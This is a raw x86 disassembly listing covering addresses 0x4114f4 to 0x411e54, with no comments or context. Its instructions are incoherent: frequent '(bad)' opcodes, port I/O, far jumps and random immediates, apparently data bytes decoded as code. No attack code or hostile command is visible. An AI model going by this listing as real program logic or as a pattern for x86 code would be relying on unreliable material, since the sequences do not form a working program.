  4114f4:	sbb    DWORD PTR [edi],ecx
  4114f6:	gs dec ebp
  4114f8:	les    eax,FWORD PTR [esi+0x5d]
  4114fb:	mov    ecx,cs
  4114fd:	cmp    eax,0x77f9e7bc
  411502:	pop    ebp
  411503:	(bad)  
  411504:	scas   al,BYTE PTR es:[di]
  411506:	mov    ebx,0x9b64ec8
  41150b:	push   ebp
  41150c:	pop    ss
  41150d:	or     BYTE PTR [ecx-0x38b68f3d],0xfb
  411514:	mov    esp,0x4b0bd77e
  411519:	add    DWORD PTR [edx],eax
  41151b:	call   0x4daf07
  411520:	xchg   DWORD PTR [edi+ebx*1-0x1f92f6f9],edx
  411527:	add    ecx,DWORD PTR [edx+ebp*1+0x2b5febdf]
  41152e:	mov    al,ds:0x3
	...
  411543:	add    BYTE PTR [ebx],bl
  411545:	dec    edx
  411546:	sti    
  411547:	push   esi
  411548:	cwde   
  411549:	mov    WORD PTR [edi],ss
  41154b:	pop    ds
  41154c:	(bad)  
  41154d:	mov    edi,0xbc488cfe
  411552:	mov    DWORD PTR [ebx],eax
  411554:	fs jge 0x4115b1
  411557:	(bad)
  41155a:	pop    esp
  41155b:	or     bl,ch
  41155d:	dec    ecx
  41155e:	out    0x6b,eax
  411560:	jge    0x4115dd
  411562:	(bad)  
  411563:	push   esi
  411564:	add    al,0x5a
  411566:	mov    bl,0x88
  411568:	dec    eax
  411569:	mov    eax,0x2b8bec0f
  41156e:	and    BYTE PTR [ebx+eax*8],al
  411571:	dec    ecx
  411572:	rcl    DWORD PTR [esi+0x40],cl
  411575:	mov    WORD PTR [edi-0x69408aa6],ss
  41157b:	mov    WORD PTR [eax-0x3c],ss
  41157e:	or     DWORD PTR [esp+esi*1],eax
  411581:	push   edi
  411582:	or     al,ch
  411584:	fwait
  411585:	mov    esi,0x499307f4
  41158a:	imul   DWORD PTR [ebx+0x71]
  41158d:	jp     0x41160d
  41158f:	push   esi
  411590:	adc    al,0x59
  411592:	jae    0x41157d
  411594:	jnp    0x4115cd
  411596:	mov    ebx,0x5694ccea
  41159b:	rcl    BYTE PTR [edi+0x740bd4bf],1
  4115a1:	in     eax,0x19
  4115a3:	push   edi
  4115a4:	pop    edx
  4115a5:	or     eax,0x6ba5
	...
  4115ba:	add    BYTE PTR [eax],al
  4115bc:	push   cs
  4115bd:	inc    ecx
  4115be:	das    
  4115bf:	add    ebx,DWORD PTR [ebx-0x7095f6e8]
  4115c5:	xchg   esp,eax
  4115c6:	or     BYTE PTR [edx+0x54],ch
  4115c9:	mov    bl,0x8
  4115cb:	popf   
  4115cc:	push   esp
  4115cd:	mov    esi,0x48c2057b
  4115d2:	clc    
  4115d3:	add    DWORD PTR [edx+0x57],ecx
  4115d6:	cmc    
  4115d7:	push   cs
  4115d8:	xchg   ah,dl
  4115da:	jl     0x411573
  4115dc:	pop    eax
  4115dd:	xor    ah,ch
  4115df:	xchg   ebx,eax
  4115e0:	(bad)  
  4115e1:	adc    DWORD PTR [ebp+ecx*1+0x3f],ecx
  4115e5:	mov    esi,0x9266f97b
  4115ea:	addr16 out 0x59,al
  4115ed:	mov    cl,al
  4115ef:	push   ebp
  4115f0:	daa    
  4115f1:	adc    dh,BYTE PTR [ecx+edx*8-0x78]
  4115f5:	dec    eax
  4115f6:	pop    ecx
  4115f7:	push   0xffffffc3
  4115f9:	ret    0x3d08
  4115fc:	retf   
  4115fd:	adc    DWORD PTR [ecx+edi*4-0x70],esi
  411601:	dec    eax
  411602:	dec    ebp
  411603:	inc    ecx
  411604:	mov    BYTE PTR [ebp+eiz*8+0x1848616f],dl
  41160b:	xchg   ecx,eax
  41160c:	mov    esp,0x419ef582
  411611:	dec    eax
  411612:	lock xchg esi,eax
  411614:	ror    DWORD PTR [esi-0x4083fd20],cl
  41161a:	cmc    
  41161b:	xchg   bl,al
  41161d:	ret    0xf4f5
	...
  411634:	jg     0x4115ec
  411636:	push   0xf5bed8bd
  41163b:	hlt    
  41163c:	fstp   TBYTE PTR [esi+0x48d9597b]
  411642:	sbb    BYTE PTR [ecx-0x76],dl
  411645:	mov    ch,dh
  411647:	push   esi
  411648:	mov    ecx,0x4b4ee448
  41164d:	mov    fs,eax
  41164f:	add    BYTE PTR [edx],ah
  411651:	mov    ?,ebp
  411653:	dec    DWORD PTR [edx+0xffedcd]
  411659:	ret    0x3ced
  41165c:	inc    ecx
  41165d:	imul   esi,esi,0xed5a10ff
  411663:	and    DWORD PTR [edx+0x69],eax
  411666:	idiv   bh
  411668:	add    BYTE PTR [esi-0x13],cl
  41166b:	sbb    DWORD PTR [edx+0x69],eax
  41166e:	idiv   bh
  411670:	nop
  411671:	popa   
  411672:	in     eax,dx
  411673:	adc    DWORD PTR [edx+0x69],eax
  411676:	idiv   bh
  411678:	xor    BYTE PTR ds:0x694209ed,0xf6
  41167f:	call   DWORD PTR [eax+0x30]
  411682:	in     eax,dx
  411683:	add    DWORD PTR [edx+0x40fff667],eax
  411689:	pop    esp
  41168a:	in     eax,dx
  41168b:	and    eax,0xc9089886
  411690:	daa    
  411691:	xchg   esi,eax
  411692:	or     BYTE PTR [ebp+0x3e],dl
  411695:	xor    eax,0xc488
	...
  4116aa:	add    BYTE PTR [eax],al
  4116ac:	int    0x50
  4116ae:	idiv   bh
  4116b0:	pop    eax
  4116b1:	(bad)  
  4116b2:	icebp  
  4116b3:	push   eax
  4116b4:	jmp    0xe090:0x80ff01ce
  4116bb:	(bad)  
  4116bd:	xchg   ecx,eax
  4116be:	or     BYTE PTR [ebx],cl
  4116c0:	in     eax,0x98
  4116c2:	mov    esp,DWORD PTR [ebp-0x38f76e5b]
  4116c8:	mov    al,0x60
  4116ca:	cmc    
  4116cb:	push   DWORD PTR [ebp-0x6f]
  4116ce:	int    0x45
  4116d0:	add    DWORD PTR [ecx+0xe],ebp
  4116d3:	add    BYTE PTR [ebp-0x55],ah
  4116d6:	cmc    
  4116d7:	imul   esi,DWORD PTR [ebp+0x16],0x5e8cec8d
  4116de:	pop    esp
  4116df:	(bad)  
  4116e0:	mov    esp,0xc98d09d1
  4116e5:	jg     0x4116a0
  4116e7:	mov    WORD PTR [ecx],ss
  4116e9:	xchg   DWORD PTR [esi+edi*8+0x43],eax
  4116ed:	sbb    ebx,DWORD PTR [ebp+0x74]
  4116f0:	xor    al,0x6e
  4116f2:	(bad)  
  4116f3:	sti    
  4116f4:	and    al,0x71
  4116f6:	daa    
  4116f7:	add    BYTE PTR [edx+eax*8-0x6d718cb7],cl
  4116fe:	rol    DWORD PTR [edx-0x1be4127],cl
  411704:	adc    ebp,DWORD PTR [ebp+eax*8+0x51f80b04]
  41170b:	jmp    0x0:0xe77637ce
	...
  411722:	add    BYTE PTR [eax],al
  411724:	add    ebp,DWORD PTR [esi+0x30014f59]
  41172a:	push   eax
  41172b:	imul   bl
  41172d:	fnstsw WORD PTR [esi+edi*8+0x745ab759]
  411734:	test   bl,dl
  411736:	mov    DWORD PTR [eax],edi
  411738:	rcl    ebp,cl
  41173a:	cmc    
  41173b:	mov    edi,0x8474ba40
  411740:	mov    esp,0x24fe59fd
  411745:	call   0xef8f:0xf68c40d5
  41174c:	mov    ds:0xbde75a1d,eax
  411751:	enter  0x9,0x87
  411755:	jmp    0x411727
  411757:	or     eax,0xf65c7f93
  41175c:	mov    edi,DWORD PTR [ebx]
  41175e:	pop    ecx
  41175f:	je     0x4116fd
  411761:	adc    eax,0x2b7bfb31
  411766:	pop    ecx
  411767:	mov    ah,0x7c
  411769:	xchg   ebp,eax
  41176a:	push   esi
  41176b:	push   ebx
  41176c:	push   0xffffffad
  41176e:	lahf   
  41176f:	sbb    DWORD PTR [ebx-0x44],esp
  411772:	pop    esi
  411773:	leave  
  411774:	arpl   WORD PTR [esi-0x43adad37],bp
  41177a:	dec    esi
  41177b:	fld    DWORD PTR [edi-0x53]
  41177e:	xchg   ebx,eax
  41177f:	and    eax,0x4628948c
  411784:	xchg   DWORD PTR [esp+ebx*4+0x7e],edx
	...
  41179b:	add    BYTE PTR [edi],ah
  41179d:	sbb    BYTE PTR [eax+edx*2],ah
  4117a0:	mov    ch,0x94
  4117a2:	cdq    
  4117a3:	mov    dh,0x22
  4117a5:	inc    edx
  4117a6:	out    0x5b,eax
  4117a8:	mov    ebp,0x4530687
  4117ad:	push   edx
  4117ae:	or     edx,DWORD PTR [ebx-0x80]
  4117b1:	mov    WORD PTR [edi-0x20aa8a9c],ss
  4117b7:	push   edx
  4117b8:	shl    bh,0xa7
  4117bb:	(bad)  
  4117bc:	repz mov bl,0xa5
  4117bf:	push   eax
  4117c0:	jmp    0xc02c:0x8bd8d6bb
  4117c7:	fisttp QWORD PTR [esp+edx*4+0x47]
  4117cb:	push   es
  4117cc:	mov    WORD PTR [edi+ebx*2-0x494600a5],ss
  4117d3:	push   edx
  4117d4:	ret    0xe741
  4117d7:	fist   DWORD PTR [ebx-0x4cfbdfd1]
  4117dd:	xor    DWORD PTR [edx-0x686bb345],0x9ebba15d
  4117e7:	push   edx
  4117e8:	and    BYTE PTR [edi+eax*1-0x20aad904],cl
  4117ef:	fisttp DWORD PTR [ebp+0x6b83df94]
  4117f5:	fmul   QWORD PTR [eax]
  4117f7:	ja     0x4117d7
  4117f9:	mov    edx,0xbac3f4f5
  4117fe:	jnp    0x4117f1
	...
  411814:	(bad)  
  411815:	jnp    0x411850
  411817:	pop    esi
  411818:	mov    esi,0x8fedcacc
  41181d:	popa   
  41181e:	cmp    DWORD PTR ds:0xd3f4d70a,0x3e5c2e8f
  411828:	fs xchg ebx,eax
  41182a:	loopne 0x411879
  41182c:	mov    eax,ds:0x4460f5bb
  411831:	mov    edi,0x544a8d60
  411836:	or     BYTE PTR [esi],bl
  411838:	inc    esp
  411839:	xchg   ebx,eax
  41183a:	loopne 0x4117c9
  41183c:	imul   edi,DWORD PTR [edx-0x40cbf10b],0xfffffff5
  411843:	jl     0x41184c
  411845:	mov    bl,0x5
  411847:	mov    edx,0x2bbfba5e
  41184c:	xchg   ebx,eax
  41184d:	xchg   esp,eax
  41184e:	pop    ebx
  41184f:	bound  edx,QWORD PTR [ebx+0x16]
  411852:	int    0xe5
  411854:	bound  esp,QWORD PTR es:[edx-0x17]
  411858:	rcr    DWORD PTR [edi-0xb],0x5c
  41185c:	fdiv   DWORD PTR [edx-0x45c2e449]
  411862:	jg     0x411890
  411864:	pop    esp
  411865:	push   cs
  411866:	cmp    al,0x16
  411868:	add    BYTE PTR [eax+ecx*1+0x62],dl
  41186c:	mov    ebx,DWORD PTR [edi+0x40]
  41186f:	sub    BYTE PTR [eax-0x3c16c9ec],cl
  411875:	dec    edi
  411876:	pusha  
  411877:	or     eax,0x0
	...
  41188c:	rcl    DWORD PTR [ebx+0x8],0x3e
  411890:	cmp    cl,cl
  411892:	daa    
  411893:	jmp    0x109a827
  411898:	mov    ebp,eax
  41189a:	pop    ebx
  41189b:	call   0x36bdf7
  4118a0:	xchg   ebp,eax
  4118a1:	fdiv   st,st(5)
  4118a3:	push   edx
  4118a5:	outs   dx,BYTE PTR es:[esi]
  4118a7:	jae    0x4118e7
  4118a9:	xlat   BYTE PTR ds:[ebx]
  4118aa:	cmc    
  4118ab:	dec    edi
  4118ac:	ret    0xde1
  4118af:	call   0x381f47
  4118b4:	int    0x9b
  4118b6:	cmp    edi,edi
  4118b8:	rcl    BYTE PTR [edi+0x8],cl
  4118bb:	inc    esi
  4118bc:	mov    ch,0xa6
  4118be:	or     BYTE PTR [ebp+0x7f],dh
  4118c1:	into   
  4118c2:	icebp  
  4118c3:	xor    esp,DWORD PTR [ebp+0xd]
  4118c6:	idiv   edi
  4118c8:	jb     0x41192d
  4118ca:	imul   DWORD PTR [esi-0x448472d3]
  4118d0:	and    cl,0xf1
  4118d3:	(bad)  
  4118d4:	clc    
  4118d5:	mov    ebp,0x654793ed
  4118da:	neg    BYTE PTR [edi+0x23]
  4118dd:	jg     0x4118a6
  4118df:	add    al,0xe5
  4118e1:	add    al,BYTE PTR [ebx-0x2b39914]
  4118e7:	xor    DWORD PTR [eax-0xabebdab],0xffffff95
  4118ee:	jnp    0x4118f4
	...
  411904:	sub    al,0x50
  411906:	or     eax,0x7914d00
  41190b:	add    BYTE PTR [ebp+0x235005d],dh
  411911:	add    BYTE PTR gs:[ebp+0x1],0x4d
  411916:	dec    esp
  411917:	clc    
  411918:	test   eax,0x20000896
  41191d:	sar    ch,cl
  41191f:	push   eax
  411920:	add    ah,bl
  411922:	icebp  
  411923:	dec    DWORD PTR [eax+ebx*4-0x28e600f8]
  41192a:	pop    eax
  41192b:	adc    al,0x4d
  41192d:	xchg   cl,cl
  41192f:	inc    DWORD PTR [edx+0x2fe745c0]
  411935:	loop   0x411940
  411937:	add    BYTE PTR [edi],cl
  411939:	inc    ebx
  41193a:	or     al,0x76
  41193c:	and    ebx,0x19730009
  411942:	sar    BYTE PTR [esi-0x19],cl
  411945:	in     al,dx
  411946:	or     edi,edi
  411948:	fld    DWORD PTR [edi+0x58]
  41194b:	je     0x4118e1
  41194d:	arpl   WORD PTR [esi+0x587a435c],bp
  411953:	je     0x41198d
  411955:	push   ebx
  411956:	xchg   esp,eax
  411957:	xor    esi,DWORD PTR [ebx]
  411959:	push   0x32
  41195b:	rcl    DWORD PTR [ebx+ebp*4+0x2e308abe],0x4d
  411963:	sti    
  411964:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411965:	stos   DWORD PTR es:[edi],eax
  411966:	rcl    DWORD PTR [ebp+0x0],cl
	...
  411979:	add    BYTE PTR [eax],al
  41197b:	add    BYTE PTR [ebx],dl
  41197d:	and    dl,dh
  41197f:	out    0xd9,eax
  411981:	sti    
  411982:	pop    eax
  411983:	(bad)  
  411984:	adc    eax,0x106745f0
  411989:	push   ss
  41198a:	retf   
  41198b:	push   edx
  41198d:	aas    
  41198e:	icebp  
  41198f:	out    0x62,eax
  411991:	mov    dl,0x45
  411993:	(bad)  
  411994:	jecxz  0x4119f5
  411996:	pop    eax
  411997:	(bad)  
  411998:	popa   
  411999:	mov    bl,0x51
  41199b:	neg    DWORD PTR [ebp-0x3137ba36]
  4119a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119a2:	or     DWORD PTR [ebp+0x17],edx
  4119a5:	(bad)  
  4119a6:	mov    ebx,eax
  4119a8:	mov    eax,0x5b6a0c54
  4119ad:	jmp    0x158b:0x93b407cf
  4119b4:	mov    ds:0x97c978b8,eax
  4119b9:	sub    ebx,edi
  4119bb:	add    esp,DWORD PTR [ebx-0x964f807]
  4119c1:	push   ebp
  4119c2:	(bad)  
  4119c4:	cmp    DWORD PTR [eax+eiz*1],ebp
  4119c7:	add    al,0x7b
  4119c9:	inc    edx
  4119ca:	out    0x5b,eax
  4119cc:	or     bl,BYTE PTR [edx+0x66]
  4119cf:	dec    edi
  4119d0:	push   0x42
  4119d2:	imul   ecx,DWORD PTR [edi-0x28],0xffffff8c
  4119d6:	push   edi
  4119d7:	xchg   ecx,eax
  4119d8:	pushf  
  4119d9:	mov    bh,0x5e
  4119db:	cmp    eax,0xb8df914d
	...
  4119f4:	push   ss
  4119f5:	test   eax,0x5f5f4862
  4119fa:	sahf   
  4119fb:	dec    esi
  4119fc:	ror    BYTE PTR [eax-0x488b03b9],0x26
  411a03:	sti    
  411a04:	jmp    0x411a47
  411a06:	in     eax,0xae
  411a08:	ror    ebp,0x21
  411a0b:	cld    
  411a0c:	sbb    ecx,DWORD PTR [ecx]
  411a0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a0f:	push   ebx
  411a10:	ret    
  411a11:	mov    bh,0x9c
  411a13:	push   ebx
  411a15:	std    
  411a16:	enter  0x24e,0x8c
  411a1a:	pop    ds
  411a1b:	dec    DWORD PTR [edi]
  411a1d:	pop    esp
  411a1e:	loopne 0x411a23
  411a20:	mov    WORD PTR [edi+0x521a4f7c],?
  411a26:	retf   
  411a27:	xor    al,0x70
  411a29:	fcom   st(6)
  411a2b:	fdiv   DWORD PTR [edi-0x14b3ab49]
  411a31:	(bad)  
  411a32:	and    cl,BYTE PTR [edi-0x36]
  411a35:	mov    ebx,DWORD PTR [edi+0x2d0d8ad7]
  411a3b:	pusha  
  411a3c:	push   es
  411a3d:	lds    ecx,FWORD PTR [eax]
  411a3f:	ret    0xb6a3
  411a42:	jnp    0x4119f1
  411a44:	inc    edi
  411a45:	mov    eax,0xc52a639
  411a4a:	dec    esp
  411a4b:	lea    ecx,[edx+0x40]
  411a4e:	hlt    
  411a4f:	xchg   esi,eax
  411a50:	mov    ah,0xab
  411a52:	cmc    
  411a53:	adc    al,0xd8
  411a55:	scas   eax,DWORD PTR es:[edi]
  411a56:	sub    DWORD PTR [ebp+0x0],edi
	...
  411a6c:	shl    BYTE PTR [esi-0x53240b7f],cl
  411a72:	call   0xb5d5aa60
  411a77:	xchg   BYTE PTR [esi+0x54],al
  411a7a:	or     BYTE PTR [esi+0x94daf19],bh
  411a80:	nop
  411a81:	xchg   esp,eax
  411a82:	add    DWORD PTR [ecx],ebp
  411a84:	cmp    edx,DWORD PTR [ebp-0x7d24051f]
  411a8a:	enter  0xd280,0xb6
  411a8e:	cmc    
  411a8f:	ds fucomp st(1)
  411a92:	xor    dh,ch
  411a94:	push   esp
  411a95:	mov    al,0xdf
  411a97:	and    DWORD PTR [edi-0x408df76c],ecx
  411a9d:	das    
  411a9e:	jmp    0x1201:0x5bb75092
  411aa5:	xchg   edi,eax
  411aa6:	or     cl,ch
  411aa8:	push   es
  411aa9:	idiv   DWORD PTR [ebx-0x14]
  411aac:	pusha  
  411aad:	add    eax,0x548fe909
  411ab2:	cmp    ecx,0x81e04077
  411ab8:	jae    0x411ae4
  411aba:	inc    edi
  411abb:	jmp    0x94ec9d9
  411ac0:	nop
  411ac1:	xchg   esp,eax
  411ac2:	add    DWORD PTR [ecx+0x71df8fbb],ebp
  411ac8:	nop
  411ac9:	xchg   esp,eax
  411aca:	or     BYTE PTR [eax],al
  411acc:	aas    
  411acd:	ror    bl,0x0
	...
  411ae4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ae5:	add    bl,BYTE PTR [eax-0x1]
  411ae8:	jo     0x411b42
  411aea:	in     eax,dx
  411aeb:	aas    
  411aec:	fist   DWORD PTR [edx-0x240af4f8]
  411af2:	jns    0x411a7d
  411af4:	jo     0x411b22
  411af6:	div    BYTE PTR [ebp+0xd]
  411af9:	pop    eax
  411afa:	adc    eax,DWORD PTR [ebx+0x1a]
  411afd:	dec    eax
  411afe:	add    BYTE PTR [ebp+0x15],0x48
  411b02:	jl     0x411ae8
  411b04:	cli    
  411b05:	fst    st(5)
  411b07:	call   0x37e971
  411b0c:	outs   dx,BYTE PTR ds:[esi]
  411b0d:	push   edx
  411b0e:	jns    0x411b5f
  411b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b11:	aad    0xe9
  411b13:	inc    DWORD PTR [eax+0x6541626a]
  411b19:	cmp    DWORD PTR [eax+ebx*8-0x26],ecx
  411b1d:	popf   
  411b1e:	(bad)  
  411b1f:	imul   esi,esp,0xffffff91
  411b22:	test   DWORD PTR [ebp-0x5f],eax
  411b25:	xor    eax,0x3715d44c
  411b2a:	dec    esp
  411b2b:	in     al,0x5
  411b2d:	dec    ecx
  411b2e:	jl     0x411b10
  411b30:	jge    0x411b22
  411b32:	push   ecx
  411b33:	(bad)  
  411b34:	jp     0x411af1
  411b36:	mov    ch,0x74
  411b38:	inc    ebx
  411b39:	fimul  DWORD PTR [eax]
  411b3b:	add    BYTE PTR [edx],cl
  411b3d:	or     bh,dh
  411b3f:	jne    0x411b3e
  411b41:	pop    ecx
  411b42:	retf   0xfa2f
  411b45:	dec    eax
  411b46:	div    BYTE PTR [ebp+0x0]
	...
  411b59:	add    BYTE PTR [eax],al
  411b5b:	add    BYTE PTR [ebp-0x72f783b9],cl
  411b61:	stos   BYTE PTR es:[edi],al
  411b62:	and    eax,0x7c48eaff
  411b67:	in     al,0xba
  411b69:	(bad)  
  411b6b:	dec    DWORD PTR [eax+ebx*2-0x4953180c]
  411b72:	inc    esp
  411b73:	inc    bl
  411b75:	js     0x411be3
  411b77:	out    0xbd,eax
  411b79:	mov    ecx,0xa356fe44
  411b7e:	je     0x411b8f
  411b80:	xchg   edi,eax
  411b81:	std    
  411b82:	fisttp QWORD PTR [eax]
  411b84:	or     al,0xae
  411b86:	or     DWORD PTR [edi],ecx
  411b88:	adc    DWORD PTR [ebx-0x6c6c01bc],edi
  411b8e:	or     al,BYTE PTR [eax]
  411b90:	jnp    0x411bd7
  411b92:	inc    esp
  411b93:	je     0x411b29
  411b95:	and    ecx,DWORD PTR [esi+0x44367b2e]
  411b9b:	je     0x411c0d
  411b9d:	ds fdivrp st(7),st
  411ba0:	imul   eax,eax,0xfffffff1
  411ba3:	out    0x30,eax
  411ba5:	sahf   
  411ba6:	inc    ebx
  411ba7:	(bad)  
  411ba8:	pop    ebx
  411ba9:	loopne 0x411c00
  411bab:	out    0x11,eax
  411bad:	cdq    
  411bae:	inc    ebx
  411baf:	(bad)  
  411bb0:	sbb    eax,esi
  411bb2:	pop    ecx
  411bb3:	dec    edi
  411bb4:	xor    al,0x5f
  411bb6:	add    edi,edi
  411bb8:	cmp    esp,DWORD PTR [edx+0x9]
  411bbb:	pop    edi
  411bbc:	shl    BYTE PTR [edi+eax*2+0x7],cl
	...
  411bd4:	mov    WORD PTR [eax],fs
  411bd6:	jno    0x411bc3
  411bd8:	and    ebx,DWORD PTR [eax]
  411bda:	idiv   dh
  411bdc:	mov    eax,ds:0x126251c3
  411be1:	sahf   
  411be2:	inc    esp
  411be3:	enter  0xd6ce,0x9
  411be7:	push   ebp
  411be8:	pop    ss
  411be9:	lahf   
  411bea:	inc    esp
  411beb:	je     0x411b75
  411bed:	mov    ds:0xbdf3356c,eax
  411bf2:	std    
  411bf3:	mov    edi,0x7444ca60
  411bf8:	jl     0x411b8e
  411bfa:	das    
  411bfb:	pop    esp
  411bfc:	pusha  
  411bfd:	jle    0x411bd5
  411bff:	dec    ebx
  411c00:	inc    ebx
  411c01:	sub    al,0xd3
  411c03:	popa   
  411c04:	mov    edx,DWORD PTR [esi+eax*8+0x34b59bd1]
  411c0b:	lock dec ebx
  411c0d:	mov    ch,0x3c
  411c0f:	cld    
  411c10:	stos   DWORD PTR es:[edi],eax
  411c11:	call   FWORD PTR [eax]
  411c13:	dec    ebx
  411c14:	stos   BYTE PTR es:[edi],al
  411c15:	stos   DWORD PTR es:[edi],eax
  411c16:	inc    edi
  411c17:	push   ss
  411c18:	mov    ds:0x7f46b8b4,eax
  411c1d:	xchg   esp,eax
  411c1e:	cmp    al,0x7f
  411c20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c21:	sub    ebx,edi
  411c23:	add    edi,DWORD PTR [ebx-0xd]
  411c26:	pop    es
  411c27:	not    BYTE PTR ds:[ebp-0x21]
  411c2b:	dec    edx
  411c2c:	add    BYTE PTR [ecx+0x2a72ee19],ah
  411c32:	out    0x5b,eax
  411c34:	cmp    esi,DWORD PTR [esi+eiz*2+0x4b]
	...
  411c4b:	add    bl,ch
  411c4d:	xchg   esp,eax
  411c4e:	fistp  WORD PTR [edx+0x19]
  411c51:	cmp    eax,0x94ccdf39
  411c56:	pop    esi
  411c57:	rcl    DWORD PTR [edi-0x47b51cc2],1
  411c5d:	pushf  
  411c5e:	push   edi
  411c5f:	ins    DWORD PTR es:[edi],dx
  411c60:	cmp    dh,BYTE PTR [esi+esi*1+0x4eb433dc]
  411c67:	mov    dh,BYTE PTR [ebx+0x23c4cade]
  411c6d:	mov    bl,0x94
  411c6f:	mul    DWORD PTR [ebp-0x742ee989]
  411c75:	mov    esp,0xb40a4b61
  411c7a:	sub    BYTE PTR [esi-0x75],al
  411c7d:	xchg   esp,eax
  411c7e:	xchg   esp,eax
  411c7f:	jle    0x411c68
  411c81:	cmp    al,0x15
  411c83:	fisttp WORD PTR [esp+edx*4+0x8]
  411c87:	sbb    DWORD PTR [esi+edi*1+0x2856e947],0xc77ce618
  411c92:	inc    eax
  411c93:	sub    BYTE PTR [eax+0x571c1bbc],cl
  411c99:	mov    dl,0x1
  411c9b:	test   eax,0xa3a98ed3
  411ca0:	ficom  DWORD PTR [eax+ecx*1-0x42]
  411ca4:	fcomp  QWORD PTR [edi-0x4457c30b]
  411caa:	mov    ebp,DWORD PTR [esi-0x230a4daa]
	...
  411cc4:	imul   edi,DWORD PTR [esi],0xd137e947
  411cca:	aaa    
  411ccb:	xchg   esi,eax
  411ccc:	(bad)  
  411ccd:	fmul   st(2),st
  411ccf:	fisttp QWORD PTR [edi+0x12958149]
  411cd5:	xlat   BYTE PTR ds:[ebx]
  411cd6:	hlt    
  411cd7:	adc    ecx,DWORD PTR [eax+0x3c764f3e]
  411cdd:	fwait
  411cde:	loopne 0x411cc9
  411ce0:	xchg   BYTE PTR [ebx-0x50b38f0b],dh
  411ce6:	pusha  
  411ce7:	mov    al,0x3b
  411ce9:	push   esp
  411cea:	or     cl,al
  411cec:	mov    ds:0xd6e94740,eax
  411cf1:	sub    BYTE PTR [eax],al
  411cf3:	push   ecx
  411cf4:	stos   BYTE PTR es:[edi],al
  411cf5:	mov    dl,0xf5
  411cf7:	ds (bad) 
  411cf9:	sub    ah,dh
  411cfb:	ss cmp al,0x9b
  411cfe:	loopne 0x411d07
  411d00:	xchg   DWORD PTR [ebx-0x682ecf0b],esi
  411d06:	or     BYTE PTR [edx+edx*4+0x532d89bf],dh
  411d0d:	cmp    eax,0xb2378308
  411d12:	jnp    0x411d14
  411d14:	std    
  411d15:	dec    esi
  411d16:	mov    edi,0x805cf22e
  411d1b:	inc    ebp
  411d1c:	loope  0x411ceb
  411d1e:	mov    ebp,DWORD PTR [esp+esi*1-0x69]
  411d22:	pusha  
  411d23:	outs   dx,BYTE PTR ds:[esi]
  411d24:	inc    ecx
  411d25:	xlat   BYTE PTR ds:[ebx]
  411d26:	cmc    
  411d27:	inc    BYTE PTR [eax]
	...
  411d39:	add    BYTE PTR [eax],al
  411d3b:	add    BYTE PTR [eax],bh
  411d3d:	mov    al,0xed
  411d3f:	gs loop 0x411d9e
  411d42:	idiv   bh
  411d44:	pop    eax
  411d45:	pop    esp
  411d46:	div    BYTE PTR [ebp-0x43]
  411d49:	dec    esi
  411d4a:	in     eax,0x2e
  411d4c:	repnz pop esp
  411d4e:	rol    dl,0xb9
  411d51:	xchg   esi,eax
  411d52:	pop    ebx
  411d53:	mov    esp,ecx
  411d55:	sbb    dl,cl
  411d57:	cld    
  411d58:	jg     0x411cf2
  411d5a:	bound  ebx,QWORD PTR [edx-0xe]
  411d5d:	loop   0x411d6c
  411d5f:	call   0x36ac6d
  411d64:	in     al,dx
  411d65:	icebp  
  411d66:	icebp  
  411d67:	push   0x65
  411d69:	into   
  411d6a:	retf   0xa46c
  411d6d:	cwde   
  411d6e:	pusha  
  411d6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d70:	xchg   ecx,eax
  411d71:	aad    0xf5
  411d73:	(bad)  
  411d74:	sbb    BYTE PTR [ecx+0x4d],ch
  411d77:	inc    ecx
  411d78:	gs dec esi
  411d7a:	dec    edi
  411d7b:	xor    al,0xb2
  411d7d:	pop    ebx
  411d7e:	add    al,al
  411d80:	imul   edi,DWORD PTR [edi-0x69ca97bb],0x645dbee5
  411d8a:	popa   
  411d8b:	inc    ecx
  411d8c:	and    eax,0x2d75f6e6
  411d91:	dec    esi
  411d92:	adc    DWORD PTR [edx+0x72],ebx
  411d95:	pop    ebx
  411d96:	in     eax,dx
  411d97:	and    eax,0x6af65d34
  411d9c:	and    eax,0x6ccace
	...
  411db1:	add    BYTE PTR [eax],al
  411db3:	add    BYTE PTR [esp+edi*8+0x302a6809],cl
  411dba:	retf   0x73ff
  411dbd:	mov    ebp,0x840c0009
  411dc2:	daa    
  411dc3:	xor    al,0xeb
  411dc5:	stos   BYTE PTR es:[edi],al
  411dc6:	hlt    
  411dc7:	mov    edi,0x67b9c458
  411dcc:	mov    WORD PTR [ebx-0x169b42b0],?
  411dd2:	fld    QWORD PTR [eax-0x74]
  411dd5:	imul   edi,DWORD PTR [edi],0x74
  411dd8:	xchg   esp,eax
  411dd9:	rcl    DWORD PTR [edx+0x58],cl
  411ddc:	mov    ebx,0x7cf151da
  411de1:	repnz inc eax
  411de3:	imul   ecx,DWORD PTR [ebx+edx*2-0x44b294cd],0x7c28a5d1
  411dee:	or     al,0xff
  411df0:	pop    ecx
  411df1:	out    dx,al
  411df2:	mov    cl,0x40
  411df4:	mov    WORD PTR [ebx],ss
  411df6:	pop    ebp
  411df7:	xor    al,BYTE PTR [ebx+0xbff522]
  411dfd:	mov    ch,0xb9
  411dff:	mov    WORD PTR [bp+di-0x42b0],?
  411e04:	hlt    
  411e05:	adc    esi,ebx
  411e07:	inc    eax
  411e08:	mov    WORD PTR [ebx+0x4384743f],cs
  411e0e:	xchg   BYTE PTR [eax+0x53],bl
  411e11:	push   edx
  411e12:	push   ecx
  411e13:	mov    ebp,0x69404a7c
	...
  411e2c:	mov    ebx,ss
  411e2e:	xor    al,0x6b
  411e30:	int    0xbb
  411e32:	shl    DWORD PTR [ebp+0x6809fca0],1
  411e38:	mov    ?,WORD PTR [ebx+0x7b348009]
  411e3e:	sbb    al,0xff
  411e40:	sbb    edx,DWORD PTR [edx+edi*8-0x507460bd]
  411e47:	fisttp DWORD PTR [ebx]
  411e49:	mov    cl,0xe
  411e4b:	mov    DWORD PTR [ebx-0x36],ebp
  411e4e:	jae    0x411e12
  411e50:	sti    
  411e51:	pusha  
  411e52:	push   cs
  411e53:	into   
  411e54:	mov    edi,DWORD PTR [ecx+eiz*2+0x7b0eaaa]
